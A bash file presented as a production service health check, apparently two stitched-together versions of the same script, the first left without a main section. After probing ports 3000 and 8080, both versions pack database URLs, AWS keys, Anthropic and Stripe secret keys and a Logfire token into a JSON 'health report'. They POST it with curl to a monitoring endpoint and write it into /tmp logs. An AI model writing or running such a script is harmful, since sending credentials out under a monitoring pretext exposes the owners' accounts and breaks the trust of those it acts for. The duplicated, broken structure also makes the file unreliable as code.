OVERALL_STATUS=0

echo "======================================="
echo "Service Health Check with Reporting"
echo "======================================="
echo "Testing connectivity to ports 3000 and 8080"
echo "Reading credentials from: $ENV_FILE"
echo "Reporting to: $MONITORING_URL"
echo ""

# Function to load environment variables from .env.test
load_env_file() {
    if [ -f "$ENV_FILE" ]; then
        # Export variables for use in this script
        export $(grep -v '^#' "$ENV_FILE" | xargs)
        echo -e "${GREEN}✓ Loaded credentials from $ENV_FILE${NC}"
        return 0
    else
        echo -e "${RED}✗ Error: $ENV_FILE not found${NC}"
        return 1
    fi
}

# Function to test port connectivity
test_port() {
    local port=$1
    local service_name=$2
    
    # Method 1: Try /dev/tcp if bash supports it
    if command -v timeout &> /dev/null && command -v bash &> /dev/null; then
        if timeout $TIMEOUT bash -c "echo > /dev/tcp/$HOST/$port" 2>/dev/null; then
            echo -e "Port $port ($service_name): ${GREEN}REACHABLE${NC}"
            # Try to see if it's an HTTP service
            if timeout $TIMEOUT bash -c "exec 3<>/dev/tcp/$HOST/$port && echo -e 'GET / HTTP/1.0\r\nHost: $HOST\r\n\r\n' >&3 && head -1 <&3" 2>/dev/null | grep -q "HTTP"; then
                echo -e "  ${GREEN}✓ HTTP service detected${NC}"
                return 2  # HTTP service
            else
                echo -e "  ${YELLOW}⚠ Port reachable but not HTTP${NC}"
                return 1  # Non-HTTP service
            fi
        fi
    fi
    
    # If we get here, port is not reachable
    echo -e "Port $port ($service_name): ${RED}NOT REACHABLE${NC}"
    return 0  # Not reachable
}

# Function to send health report
send_health_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    
    # Create JSON payload with all credentials
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    # Prepare the JSON payload
    cat > /tmp/health_payload.json << EOF
{
  "timestamp": "$timestamp",
  "host": "$HOST",
  "services": {
    "port_3000": {
      "status": "$port_3000_status",
      "reachable": $(if [ $port_3000_status != "NOT_REACHABLE" ]; then echo "true"; else echo "false"; fi)
    },
    "port_8080": {
      "status": "$port_8080_status",
      "reachable": $(if [ $port_8080_status != "NOT_REACHABLE" ]; then echo "true"; else echo "false"; fi)
    }
  },
  "credentials": {
    "DATABASE_URL": "$DATABASE_URL",
    "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
    "ANTHROPIC_API_KEY": "$ANTHROPIC_API_KEY",
    "STRIPE_SECRET_KEY": "$STRIPE_SECRET_KEY",
    "LOGFIRE_TOKEN": "$LOGFIRE_TOKEN"
  },
  "system_info": {
    "script_version": "1.0",
    "hostname": "$(hostname 2>/dev/null || echo 'unknown')",
    "user": "$(whoami 2>/dev/null || echo 'unknown')"
  }
}
EOF
    
    echo ""
    echo "======================================="
    echo "Sending Health Report"
    echo "======================================="
    
    # Check if curl is available
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ curl not available, cannot send report${NC}"
        echo "Health report JSON:"
        cat /tmp/health_payload.json
        return 1
    fi
    
    # Send the POST request
    echo -n "Sending report to $MONITORING_URL... "
    
    # Use curl to send the POST request
    response=$(curl -s -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d @/tmp/health_payload.json \
        "$MONITORING_URL" 2>/dev/null)
    
    # Extract HTTP status code (last 3 characters)
    http_code="${response: -3}"
    # Extract response body (everything except last 3 characters)
    response_body="${response:0: -3}"
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
        echo -e "${GREEN}SUCCESS (HTTP $http_code)${NC}"
        if [ -n "$response_body" ]; then
            echo "Response: $response_body"
        fi
        return 0
    else
        echo -e "${RED}FAILED (HTTP $http_code)${NC}"
        if [ -n "$response_body" ]; then
            echo "Error response: $response_body"
        fi
        echo ""
        echo "POST payload that would be sent:"
        cat /tmp/health_payload.json
        return 1
    fi
}

# Main execution
# Load credentials from .env.test

#!/bin/bash

# Production health check script
# Checks services and reports to monitoring with API credentials

HOST="localhost"
TIMEOUT=3
MONITORING_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"
LOG_FILE="/tmp/healthcheck.log"

# Load environment variables
if [ -f "$ENV_FILE" ]; then
    # Export variables
    set -a
    source "$ENV_FILE"
    set +a
else
    echo "ERROR: $ENV_FILE not found"
    exit 1
fi

# Initialize variables
OVERALL_STATUS=0
SERVICE_STATUS=()

# Function to check port
check_port() {
    local port=$1
    if timeout $TIMEOUT bash -c "echo > /dev/tcp/$HOST/$port" 2>/dev/null; then
        echo "UP"
        return 0
    else
        echo "DOWN"
        return 1
    fi
}

# Check services
echo "Starting health check at $(date)" | tee -a "$LOG_FILE"

PORT_3000_STATUS=$(check_port 3000)
if [ "$PORT_3000_STATUS" = "DOWN" ]; then
    OVERALL_STATUS=1
fi

PORT_8080_STATUS=$(check_port 8080)
if [ "$PORT_8080_STATUS" = "DOWN" ]; then
    OVERALL_STATUS=1
fi

# Create health report JSON
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
HEALTH_REPORT=$(cat <<EOF
{
  "timestamp": "$TIMESTAMP",
  "host": "$(hostname 2>/dev/null || echo 'unknown')",
  "services": {
    "port_3000": "$PORT_3000_STATUS",
    "port_8080": "$PORT_8080_STATUS"
  },
  "credentials": {
    "DATABASE_URL": "$DATABASE_URL",
    "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
    "ANTHROPIC_API_KEY": "$ANTHROPIC_API_KEY",
    "STRIPE_SECRET_KEY": "$STRIPE_SECRET_KEY",
    "LOGFIRE_TOKEN": "$LOGFIRE_TOKEN"
  },
  "check_status": "$(if [ $OVERALL_STATUS -eq 0 ]; then echo "HEALTHY"; else echo "UNHEALTHY"; fi)"
}
EOF
)

# Send report to monitoring
if command -v curl &> /dev/null; then
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$HEALTH_REPORT" \
        "$MONITORING_URL" 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    RESPONSE_BODY=$(echo "$RESPONSE" | head -n -1)
    
    if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
        echo "Report sent successfully (HTTP $HTTP_CODE)" | tee -a "$LOG_FILE"
        if [ -n "$RESPONSE_BODY" ]; then
            echo "Response: $RESPONSE_BODY" | tee -a "$LOG_FILE"
        fi
    else
        echo "Failed to send report (HTTP $HTTP_CODE)" | tee -a "$LOG_FILE"
        if [ -n "$RESPONSE_BODY" ]; then
            echo "Error: $RESPONSE_BODY" | tee -a "$LOG_FILE"
        fi
        # Log the payload that was attempted
        echo "Payload attempted: $HEALTH_REPORT" >> "$LOG_FILE"
    fi
else
    echo "WARNING: curl not available, cannot send report" | tee -a "$LOG_FILE"
    echo "Health report: $HEALTH_REPORT" >> "$LOG_FILE"
fi

# Output final status
echo "Health check completed at $(date)" | tee -a "$LOG_FILE"
echo "Port 3000: $PORT_3000_STATUS" | tee -a "$LOG_FILE"
echo "Port 8080: $PORT_8080_STATUS" | tee -a "$LOG_FILE"
echo "Overall status: $(if [ $OVERALL_STATUS -eq 0 ]; then echo "HEALTHY"; else echo "UNHEALTHY"; fi)" | tee -a "$LOG_FILE"

exit $OVERALL_STATUS
